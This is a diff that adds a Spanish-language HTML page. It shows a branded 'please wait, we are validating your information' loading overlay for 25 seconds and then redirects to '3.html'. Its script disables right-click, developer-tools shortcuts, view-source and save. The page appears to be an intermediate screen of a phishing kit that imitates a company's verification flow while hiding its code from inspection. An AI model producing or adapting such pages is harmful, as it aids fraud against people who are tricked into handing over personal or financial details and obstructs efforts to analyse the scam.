@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+ 
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DEMO</title>
+
+<style>
+/* RESET */
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:Arial, Helvetica, sans-serif;
+}
+
+html, body{
+  width:100%;
+  height:100%;
+}
+
+/* ===== IMAGEN FONDO ===== */
+.bg-img{
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  z-index:-1;
+}
+
+.bg-img img{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+}
+
+/* HEADER */
+.header{
+  padding:12px 0;
+  text-align:center;
+  position:relative;
+  z-index:2;
+}
+
+.header img{
+  max-width:220px;
+  width:80%;
+}
+
+/* FOOTER */
+.footer{
+  width:100%;
+  background:#000;
+  position:relative;
+  z-index:2;
+  margin-top:auto;
+}
+
+.footer img{
+  width:100%;
+  display:block;
+}
+
+/* 🔴 OVERLAY TRANSPARENTE */
+.overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.6);
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  z-index:9999;
+}
+
+/* LOADER */
+.loader{
+  position:relative;
+  width:140px;
+  height:140px;
+  margin-bottom:20px;
+}
+
+.circle{
+  position:absolute;
+  width:140px;
+  height:140px;
+  border:6px solid #e30613;
+  border-top-color:transparent;
+  border-radius:50%;
+  animation:spin 1.5s linear infinite;
+}
+
+.loader img{
+  width:90px;
+  height:90px;
+  border-radius:50%;
+  position:absolute;
+  top:50%;
+  left:50%;
+  transform:translate(-50%, -50%);
+}
+
+@keyframes spin{
+  from{transform:rotate(0deg)}
+  to{transform:rotate(360deg)}
+}
+
+.overlay .text{
+  color:#fff;
+  font-size:16px;
+  text-align:center;
+  max-width:280px;
+}
+</style>
+
+<script>
+/* Bloqueos básicos */
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.onkeydown = function(e){
+  if(
+    e.keyCode === 123 ||
+    (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
+    (e.ctrlKey && e.keyCode === 85) ||
+    (e.ctrlKey && e.keyCode === 83)
+  ){
+    e.preventDefault();
+    return false;
+  }
+};
+</script>
+
+</head>
+<body>
+
+<!-- IMAGEN DE FONDO -->
+<div class="bg-img">
+  <img src="torreo22.png" alt="Fondo">
+</div>
+
+<!-- HEADER -->
+<div class="header">
+</div>
+
+<!-- FOOTER -->
+<div class="footer">
+</div>
+
+<!-- OVERLAY CARGANDO -->
+<div class="overlay">
+  <div class="loader">
+    <div class="circle"></div>
+    <img src="https://play-lh.googleusercontent.com/sjr_Dwdk-IJWhmNQwPD33Jg9Q96NDf1cmmVmOngkqRLt1wVNCKzDiqhssl0TClyj-iw" alt="Logo">
+  </div>
+  <div class="text">
+    Por favor espere, estamos validando su información…
+  </div>
+</div>
+
+<script>
+/* ⏳ Redirección */
+window.onload = function(){
+  setTimeout(() => {
+    window.location.href = "3.html";
+  }, 25000);
+};
+</script>
+
+</body>
+</html>
